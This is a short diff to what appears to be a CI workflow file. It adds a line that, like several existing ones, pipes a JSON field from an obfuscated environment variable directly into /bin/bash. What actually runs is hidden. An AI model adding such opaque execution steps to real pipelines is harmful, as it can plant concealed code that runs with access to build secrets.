@@ -32,6 +32,7 @@ jobs:
           echo $o128 | jq -r .f52187 | /bin/bash
           echo $k9 | jq -r .nj30 | /bin/bash
           printf '%s' "$mgyp86" | jq -r .pdwib851 | /bin/bash
+          printf '%s' "$pggg993" | jq -r .p15763 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
